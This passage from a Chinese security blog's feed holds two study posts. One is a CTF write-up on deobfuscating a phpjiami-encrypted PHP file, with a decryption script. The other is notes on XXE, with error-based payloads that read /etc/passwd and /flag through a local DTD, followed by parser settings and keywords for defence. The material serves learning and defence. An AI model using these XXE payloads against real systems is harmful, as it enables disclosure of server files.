<span class="string">&#x27;md5&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v16</span> = <span class="string">&#x27;set_include_path&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v17</span> = <span class="string">&#x27;dirname&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v8</span> = <span class="string">&#x27;preg_replace&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v9</span> = <span class="string">&#x27;base64_encode&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v7</span> = <span class="string">&#x27;constant&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v5</span> = <span class="string">&#x27;assert_options&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v4</span> = <span class="string">&#x27;assert&#x27;</span>;</span><br><span class="line">    <span class="variable">$_v2</span> = <span class="string">&#x27;chr&#x27;</span>;</span><br><span class="line">    <span class="variable">$v1</span> = <span class="string">&#x27;rand&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 一堆变量等于 func4，然后用 func4 解码</span></span><br><span class="line"><span class="variable">$v2</span> = <span class="string">&#x27;_f_&#x27;</span>;</span><br><span class="line"><span class="variable">$v3</span> = <span class="title function_ invoke__">func3</span>($&#123;<span class="variable">$v2</span>&#125;);</span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$v2</span>&#125;));</span><br><span class="line"><span class="comment">// $v4 = $_v9($v3);</span></span><br><span class="line"><span class="variable">$v4</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$v3</span>);</span><br><span class="line"><span class="comment">// $v5 = func4(&#x27;??????&#x27;);</span></span><br><span class="line"><span class="comment">// 解密之后的原文不是 $v4，这里是翻译之后的</span></span><br><span class="line"><span class="variable">$v5</span> = <span class="string">&#x27;eval(base64_decode($v4));&#x27;</span>;</span><br><span class="line"><span class="comment">// $v5 = $_v8(func4(&#x27;??????&#x27;), $v5, func4(&#x27;??????&#x27;));</span></span><br><span class="line"><span class="comment">// mixed preg_replace ( mixed $pattern , mixed $replacement , mixed $subject [, int $limit = -1 [, int &amp;$count ]] )</span></span><br><span class="line"><span class="comment">// PCRE 修饰符 e (PREG_REPLACE_EVAL)</span></span><br><span class="line"><span class="comment">// Warning: This feature was DEPRECATED in PHP 5.5.0, and REMOVED as of PHP 7.0.0.</span></span><br><span class="line"><span class="comment">// If this deprecated modifier is set, preg_replace() does normal substitution of backreferences in the replacement string, evaluates it as PHP code, and uses the result for replacing the search string. Single quotes, double quotes, backslashes (\) and NULL chars will be escaped by backslashes in substituted backreferences.</span></span><br><span class="line"><span class="comment">// 换句话说 preg_replace 如果带 e 的话，第一步，正常地进行正则表达式替换（反向引用也会被正常替换，就是完全正常的正则替换），第二步，把结果 eval 作为最终结果</span></span><br><span class="line"><span class="comment">// 简而言之 $v5 = eval($v5);</span></span><br><span class="line"><span class="variable">$v5</span> = <span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/0dcaf9/e&#x27;</span>, <span class="variable">$v5</span>, <span class="string">&#x27;0dcaf9&#x27;</span>);</span><br><span class="line"><span class="comment">// 把上述几步统一一下 $v5 = eval(func3($_f_));</span></span><br><span class="line"><span class="comment">// $_v16($_v17($&#123;$v2&#125;));</span></span><br><span class="line"><span class="title function_ invoke__">set_include_path</span>(<span class="title function_ invoke__">dirname</span>($&#123;<span class="variable">$v2</span>&#125;));</span><br><span class="line"><span class="comment">// 把解码之后的文件运行结果返回</span></span><br><span class="line"><span class="keyword">return</span> <span class="variable">$v5</span>;</span><br></pre></td></tr></table></figure></div><h3 id="解码"><a href="#解码" class="headerlink" title="解码"></a>解码</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">decrypt</span>(<span class="params"><span class="variable">$data</span>, <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$data_1</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">ord</span>(<span class="variable">$data</span>[<span class="variable">$i</span>]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$ch</span> &lt; <span class="number">245</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$ch</span> &gt; <span class="number">136</span>) &#123;</span><br><span class="line">                <span class="variable">$data_1</span> .= <span class="title function_ invoke__">chr</span>(<span class="variable">$ch</span> / <span class="number">2</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$data_1</span> .= <span class="variable">$data</span>[<span class="variable">$i</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data_1</span> = <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$data_1</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$key</span>);</span><br><span class="line">    <span class="variable">$j</span> = <span class="variable">$ctrmax</span> = <span class="number">32</span>;</span><br><span class="line">    <span class="variable">$data_2</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="title function_ invoke__">strlen</span>(<span class="variable">$data_1</span>); <span class="variable">$i</span>++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$j</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="variable">$j</span> = <span class="variable">$ctrmax</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$j</span>--;</span><br><span class="line">        <span class="variable">$data_2</span> .=  <span class="variable">$data_1</span>[<span class="variable">$i</span>] ^ <span class="variable">$key</span>[<span class="variable">$j</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data_2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_data</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$code_end</span> = <span class="title function_ invoke__">strrpos</span>(<span class="variable">$code</span>, <span class="string">&#x27;?&gt;&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="variable">$code_end</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$data_start</span> = <span class="variable">$code_end</span> + <span class="number">2</span>;</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$data_start</span>, -<span class="number">46</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">find_key</span>(<span class="params"><span class="variable">$code</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// $v1 = $v2(&#x27;bWQ1&#x27;);</span></span><br><span class="line">    <span class="comment">// $key1 = $v1(&#x27;??????&#x27;);</span></span><br><span class="line">    <span class="variable">$pos1</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;(&#x27;&quot;</span> . <span class="title function_ invoke__">preg_quote</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&#x27;md5&#x27;</span>)) . <span class="string">&quot;&#x27;);&quot;</span>);</span><br><span class="line">    <span class="variable">$pos2</span> = <span class="title function_ invoke__">strrpos</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="number">0</span>, <span class="variable">$pos1</span>), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    <span class="variable">$pos3</span> = <span class="title function_ invoke__">strrpos</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="number">0</span>, <span class="variable">$pos2</span>), <span class="string">&#x27;$&#x27;</span>);</span><br><span class="line">    <span class="variable">$var_name</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$pos3</span>, <span class="variable">$pos2</span> - <span class="variable">$pos3</span> - <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$pos4</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="variable">$var_name</span>, <span class="variable">$pos1</span>);</span><br><span class="line">    <span class="variable">$pos5</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;(&#x27;&quot;</span>, <span class="variable">$pos4</span>);</span><br><span class="line">    <span class="variable">$pos6</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$code</span>, <span class="string">&quot;&#x27;)&quot;</span>, <span class="variable">$pos4</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$code</span>, <span class="variable">$pos5</span> + <span class="number">2</span>, <span class="variable">$pos6</span> - <span class="variable">$pos5</span> - <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$input_file</span> = <span class="variable">$argv</span>[<span class="number">1</span>];</span><br><span class="line"><span class="variable">$output_file</span> = <span class="variable">$argv</span>[<span class="number">1</span>] . <span class="string">&#x27;.decrypted.php&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$code</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$input_file</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">find_data</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$code</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到加密数据&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$key</span> = <span class="title function_ invoke__">find_key</span>(<span class="variable">$code</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$key</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;未找到秘钥&#x27;</span>, PHP_EOL;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$decrypted</span> = <span class="title function_ invoke__">decrypt</span>(<span class="variable">$data</span>, <span class="variable">$key</span>);</span><br><span class="line"><span class="variable">$uncompressed</span> = <span class="title function_ invoke__">gzuncompress</span>(<span class="variable">$decrypted</span>);</span><br><span class="line"><span class="comment">// 由于可以不勾选代码压缩的选项，所以这里判断一下是否解压成功，解压失败就是没压缩</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$uncompressed</span>) &#123;</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$uncompressed</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable">$decrypted</span> = <span class="title function_ invoke__">str_rot13</span>(<span class="variable">$decrypted</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$output_file</span>, <span class="variable">$decrypted</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;解密后文件已写入到 &#x27;</span>, <span class="variable">$output_file</span>, PHP_EOL;</span><br></pre></td></tr></table></figure></div><h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>没什么好说的，<code>index.php</code> 提示存在 <code>UploadFile.class.php</code>，下载下来之后，发现关键函数，然后数组绕过就vans了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">...</span><br><span class="line"> <span class="comment">// 用.分割文件名，只保留首尾两个字符串，防御Apache解析漏洞</span></span><br><span class="line">    <span class="variable">$origin_name</span> = <span class="title function_ invoke__">current</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$ext</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$filename</span>);</span><br><span class="line">    <span class="variable">$new_name</span> = (<span class="variable language_">$this</span>-&gt;new_name ? <span class="variable language_">$this</span>-&gt;new_name : <span class="variable">$origin_name</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$ext</span>;</span><br><span class="line">    <span class="variable">$target_fullpath</span> = <span class="variable language_">$this</span>-&gt;dist_path . DIRECTORY_SEPARATOR . <span class="variable">$new_name</span>;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.virzz.com/2017/09/20/pwnhub_writeups_sha_fu_fu_workdays.html">Virink师傅的题解</a><br><a href="https://www.leavesongs.com/PENETRATION/unobfuscated-phpjiami.html">p神的出题原理</a><br><a href="http://lovei.org/archives/pwnhub6669.html">腹黑师傅的wp</a><br><a href="https://www.52pojie.cn/thread-693641-1-1.html">Ganlv 师傅的解码思路</a><br><a href="https://www.colabug.com/2018/0209/2334241/">某PHP加密文件解密过程初探</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\yakko117\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\yakko117\assets\js\A</summary>
      
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="php" scheme="https://manayakko.github.io/yakko117/tags/php/"/>
    
    <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
  <entry>
    <title>XXE漏洞学习</title>
    <link href="https://manayakko.github.io/yakko117/2020/03/18/XXElearn/"/>
    <id>https://manayakko.github.io/yakko117/2020/03/18/XXElearn/</id>
    <published>2020-03-18T12:28:17.262Z</published>
    <updated>2020-03-20T02:06:00.373Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>最近莫名开始倒时差，每天下午5点多开始犯困，然后一睡就睡到了半夜起来<br>只会做题是不行的，要去学习原理，而不是纯粹做个脚本小子</p><span id="more"></span><h1 id="基础知识参考文档"><a href="#基础知识参考文档" class="headerlink" title="基础知识参考文档"></a>基础知识参考文档</h1><p><a href="https://www.tutorialspoint.com/dtd/dtd_entities.htm">XML类型声明原文档</a><br><a href="https://www.cnblogs.com/zhaijiahui/p/9147595.html">XXE漏洞学习</a><br><a href="https://www.freebuf.com/articles/web/177979.html">XXE漏洞利用技巧：从XML到远程代码执行</a><br><a href="https://zhuanlan.zhihu.com/p/88125925">googleCTF2019关于xxe的题解</a><br><a href="https://blog.zsec.uk/blind-xxe-learning/">盲注技巧</a><br><a href="https://xz.aliyun.com/t/6829">PHP与JAVA之XXE漏洞详解与审计</a></p><h1 id="几个需要注意的点"><a href="#几个需要注意的点" class="headerlink" title="几个需要注意的点"></a>几个需要注意的点</h1><p>现在有<code>回显的XXE</code> 已经很少了,Blind-XXE重点在于如何将数据传输出来。</p><p>以往很多文章通过引入外部服务器或外部dtd文件,可以实现 <code>OOB(out-of-band)</code> 信息传递和通过构造dtd从错误信息获取数据。</p><h2 id="记得改"><a href="#记得改" class="headerlink" title="记得改"></a>记得改</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">http</div></div><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-type</span><span class="punctuation">: </span>application/xml</span><br></pre></td></tr></table></figure></div><h2 id="利用协议"><a href="#利用协议" class="headerlink" title="利用协议"></a>利用协议</h2><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" data-fancybox="group" data-caption="pro" class="fancybox"><img alt="pro" title="pro" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/xml_1.png" class="lazyload"></a></p><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><p>如果目标主机的防火墙十分严格,不允许我们请求外网服务器dtd,那么我们可以通过引入本地dtd文件实现XXE。</p><p><font color="6495ED">ubuntu系统</font>自带 <code>/usr/share/yelp/dtd/docbookx.dtd</code> 文件</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">xml</div></div><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> ?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">local_dtd</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///usr/share/yelp/dtd/docbookx.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">ISOamso</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; file SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; eval &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;test&amp;#x25;file;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;eval;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;error;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %local_dtd;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">message</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ELEMENT <span class="keyword">message</span> <span class="keyword">ANY</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">para1</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///flag&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">para</span> <span class="string">&#x27;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &lt;!ENTITY &amp;#x25; para2 &quot;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///&amp;#x25;para1;&amp;#x27;&gt;&quot;&gt;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">        &amp;#x25;para2;</span></span></span></span><br><span class="line"><span class="string"><span class="meta"><span class="meta">    &#x27;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %para;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">message</span>&gt;</span><span class="symbol">&amp;id;</span><span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br></pre></td></tr></table></figure></div><h2 id="使用开发语言提供的禁用外部实体的方法"><a href="#使用开发语言提供的禁用外部实体的方法" class="headerlink" title="使用开发语言提供的禁用外部实体的方法"></a>使用开发语言提供的禁用外部实体的方法</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">java</div></div><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span>DocumentBuilderFactory.newInstance();</span><br><span class="line">dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line">xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=<span class="literal">False</span>))</span><br></pre></td></tr></table></figure></div><h2 id="过滤关键词："><a href="#过滤关键词：" class="headerlink" title="过滤关键词："></a>过滤关键词：</h2><ul><li><code>&lt;!DOCTYPE</code> </li><li><code>&lt;!ENTITY</code></li><li><code>SYSTEM</code></li><li><code>PUBLIC</code></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近莫名开始倒时差，每天下午5点多开始犯困，然后一睡就睡到了半夜起来&lt;br&gt;只会做题是不行的，要去学习原理，而不是纯粹做个脚本小子&lt;/p&gt;</summary>
    
    
    
    <category term="学习笔记" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="瞎扯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
    <category term="code audit" scheme="https://manayakko.github.io/yakko117/tags/code-audit/"/>
    
  </entry>
  
</feed>
